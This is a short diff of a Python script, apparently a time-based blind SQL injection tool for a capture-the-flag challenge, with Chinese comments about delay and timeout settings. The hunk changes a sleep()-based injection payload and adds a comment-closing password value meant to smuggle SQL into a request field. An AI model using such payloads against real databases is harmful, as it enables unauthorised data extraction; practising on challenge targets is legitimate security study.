@@ -19,7 +19,9 @@ for tablenum in range(0,20):
     # 定义攻击载荷
     delaytime = 1  # 定义IF语句正确后响应延时时长
     requesttimeout = 2  # httprequest的最长等待响应时长，在延时注入的场景下应该比delaytime加上网络时延大一些才可以
-    payload2 = "',sleep(" + str(delaytime) + "),1)%20--+"
+    keyword = 'flag.jpg'
+    payload_end = "',sleep(" + str(delaytime) + "),1) -- #/*"
+    password = '*/-- #'
     versionlen=0
     stop=False
     wList=[]
